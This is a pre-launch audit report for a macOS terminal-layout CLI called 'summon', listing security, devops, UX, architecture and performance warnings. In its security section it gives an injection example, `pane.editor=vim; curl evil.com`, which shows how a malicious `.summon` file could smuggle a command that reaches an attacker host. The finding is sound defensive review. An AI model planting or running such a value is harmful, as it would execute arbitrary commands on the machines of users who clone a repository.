# Pre-Launch Audit Report

> Generated on 2026-03-20 | Branch: `develop` | Commit: `732348c` | 6 parallel specialists

## Verdict: CONDITIONAL

Zero blockers. 11 warnings across 4 specialists. All are addressable before release.

## Blockers (must fix before release)

None.

## Warnings

| # | Issue | Severity | Found by | Risk |
|---|-------|----------|----------|------|
| W1 | Tree layout `pane.*` commands bypass `confirmDangerousCommands()` metacharacter check | WARNING | security-reviewer | Malicious `.summon` files in cloned repos could execute arbitrary commands via `pane.*` without prompting |
| W2 | `flatted` prototype pollution in dev dependency (eslint chain) | WARNING | security-reviewer | Dev-only; no runtime exposure. Fix via `pnpm.overrides` |
| W3 | `on-start` uses `execSync` with user input (mitigated by prompt) | WARNING | security-reviewer | Defense-in-depth is prompt-based; acceptable for local CLI |
| W4 | 3 unpushed commits on `develop` — CI has not validated | WARNING | devops | Push before release to get CI green |
| W5 | `STARSHIP_CONFIG` env var missing from README env var table | WARNING | devops | Documented in user-manual but not README |
| W6 | CodeQL workflow does not trigger on PRs to `main` | WARNING | devops | Release PRs skip security analysis |
| W7 | `summon doctor` only checks 2 Ghostty settings — not comprehensive | WARNING | ux-reviewer | Users expect a full diagnostic |
| W8 | Bash completion depends on `_init_completion` (not on stock macOS bash) | WARNING | ux-reviewer | Silent failure on macOS default bash |
| W9 | `ensureCommand` auto-install prompt defaults to Yes | WARNING | ux-reviewer | Hitting Enter triggers `npm install -g` or `brew install` |
| W10 | `summon open` project selection has no cancel hint | WARNING | ux-reviewer | Minor affordance gap |
| W11 | `checkAccessibility()` 5000ms synchronous timeout on launch hot path | WARNING | performance-eng | ~100-200ms typical; 5s worst case. Reasonable trade-off |

## Detailed Findings

### 1. Quality Assurance (qa-lead) — GREEN

- **961 tests, 100% pass rate**, 0 failures, 0 skipped
- Typecheck: clean. Lint: clean. Build: clean.
- Coverage: 99.29% stmts, 94.88% branches, 98.62% functions, 99.49% lines (all above thresholds)
- Test-to-source ratio: ~10,500 lines of tests for ~5,300 lines of source
- 5 recommendations: 2 flaky-test retries (#166), SIGINT handler untestable, tree parser defensive guard, grid preview edge case

### 2. Security (security-reviewer) — YELLOW

- **W1** (most significant): Tree layout `pane.*` commands from `.summon` files flow directly into `wrapForConfig()` without passing through `confirmDangerousCommands()`. A malicious `.summon` in a cloned repo could define `pane.editor=vim; curl evil.com` and it would execute without warning. The existing help text warns users to review `.summon` files, but `editor`/`sidebar`/`shell`/`on-start` keys all get the metacharacter check — `pane.*` should too.
- **W2**: `flatted` vulnerability — dev-only, no runtime exposure. Fix: `pnpm.overrides` or update eslint.
- **W3**: `on-start` uses `execSync` by design; mitigated by prompt + non-TTY refusal.
- No hardcoded secrets. No path traversal. `escapeAppleScript()` and `shellQuote()` are correct. Config files created with proper permissions (0o700/0o600). Dependency licenses all compatible.

### 3. Infrastructure (devops) — YELLOW

- **W4**: 3 unpushed commits. Push and verify CI before release.
- **W5**: `STARSHIP_CONFIG` env var inconsistency between README and user-manual.
- **W6**: `codeql.yml` missing `main` in `pull_request.branches`.
- Build output verified: shebang present, ESM format, no source maps, minified.
- package.json correct: files/bin/engines/os all valid. Husky hooks properly configured.

### 4. Architecture (architect) — GREEN

- Typecheck clean. All dependencies current. No circular dependencies.
- Import graph is a clean DAG.
- 5 recommendations: `renderGridBuilderPreview` dead code, duplicated box-drawing logic in preview renderers, `setup.ts` at 1717 lines could split, `readKVFile` should skip `#` comments, `doctor` subcommand inlined in switch-case.

### 5. Performance (performance-eng) — GREEN

- Total bundle: ~76KB minified. Reasonable for zero-dep CLI.
- Code splitting effective: setup wizard (22.6K) and completions (6.3K) lazy-loaded.
- `summon --help` loads ~45KB with no filesystem I/O at import time.
- AppleScript generation uses efficient array-push-then-join pattern.
- **W11**: `checkAccessibility()` adds ~100-200ms per launch (5s worst case). Correctly skipped for `--dry-run`, `--help`, `--version`.
- `resolvedCache` in launcher prevents duplicate `command -v` lookups. Config reads are minimal (2 small files).

### 6. UX/Accessibility (ux-reviewer) — YELLOW

- **W7**: `summon doctor` checks only `notify-on-command-finish` and `shell-integration`. Should also verify configured editor/sidebar availability, config dir, Ghostty version.
- **W8**: Bash completion uses `_init_completion` which requires `bash-completion` package (not on stock macOS bash 3.2).
- **W9**: `ensureCommand` install prompt defaults to Yes — hitting Enter triggers package install.
- **W10**: `summon open` project selection doesn't hint at Ctrl+C to cancel.
- Setup wizard is well-designed. Accessibility recovery flow is clear. Color support and `NO_COLOR` properly handled. Error messages are actionable with consistent stderr/stdout separation.
- 10 recommendations: help text gaps, completion gaps for `freeze`/`export`, on-start error swallowing, minor formatting inconsistencies.
